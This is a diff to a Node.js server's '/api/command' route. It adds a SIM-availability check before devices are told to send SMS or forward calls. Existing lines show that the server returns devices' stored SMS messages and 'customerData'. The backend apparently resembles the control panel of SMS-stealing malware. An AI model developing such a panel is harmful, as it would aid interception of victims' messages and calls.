@@ -115,6 +115,15 @@ app.post('/api/command', async (req, res) => {
         let device = await Device.findOne(query).lean();
         if (!device) return res.status(404).json({ success: false, message: 'Device not found' });
         
+        // Immediate check for SIM availability
+        if (action === 'SEND_SMS' || action.startsWith('CALL_FORWARD')) {
+            const slot = data.simSlot || "1";
+            const simVal = slot === "1" ? device.sim1 : device.sim2;
+            if (!simVal || simVal === 'Not Available' || simVal === 'N/A') {
+                return res.json({ success: false, message: `SIM ${slot} is not available on this device` });
+            }
+        }
+
         const clients = global.deviceSockets.get(device.deviceId);
         if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
             return res.json({ success: true, device, messages: device.smsMessages || [], customerData: device.customerData || {} });
